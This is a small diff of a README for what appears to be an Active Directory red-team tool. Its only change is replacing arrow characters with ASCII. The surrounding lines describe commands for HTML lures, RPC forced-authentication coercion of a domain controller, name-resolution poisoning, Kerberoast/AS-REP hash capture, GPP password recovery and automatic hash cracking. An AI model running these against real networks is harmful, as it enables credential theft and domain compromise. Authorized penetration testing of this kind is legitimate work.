@@ -108,8 +108,8 @@ python -m redness.cli trigger --host 10.10.0.5 --format html --out lure.html  # 
 python -m redness.cli coerce --target dc -u U -p P --listener 10.10.0.240  # RPC forced-auth coercion (run `poison` on the listener first; intrusive; gated)
 python -m redness.cli listen --duration 60 --live      # passive mDNS/LLMNR/NBT-NS/SSDP discovery on the segment
 ```
-Hash capture is automatic (AS-REP/Kerberoast via LdapEngine) → written to `loot/`.
-GPP cpasswords are recovered automatically on a credentialed scan (GppEngine → `nxc -M gpp_password`).
+Hash capture is automatic (AS-REP/Kerberoast via LdapEngine) -> written to `loot/`.
+GPP cpasswords are recovered automatically on a credentialed scan (GppEngine -> `nxc -M gpp_password`).
 Cracking is automatic when hashcat/john is on PATH: `--wordlist` uses your list, else a small
 built-in weak-password list (redness/wordlists.py) auto-cracks egregiously weak creds;
 `--no-crack` disables cracking entirely (loot still written). NetNTLMv2 *capture* is the
@@ -144,7 +144,7 @@ Build the exe (needs Python >= 3.10.1): `py -3 -m PyInstaller packaging/redness.
 
 ## First real-DC validation (THE priority - nothing has run against a live DC yet)
 Everything is unit-tested offline. Prove it in the field from Kali: `docs/VALIDATION.md`
-(checklist + lab options) and `scripts/smoke.sh` (DC=... ./scripts/smoke.sh → doctor/scan/
+(checklist + lab options) and `scripts/smoke.sh` (DC=... ./scripts/smoke.sh -> doctor/scan/
 passive-poison). Real tool output is the source of truth; if a parser misses a line format,
 add a captured sample to the matching tests/ file.
 
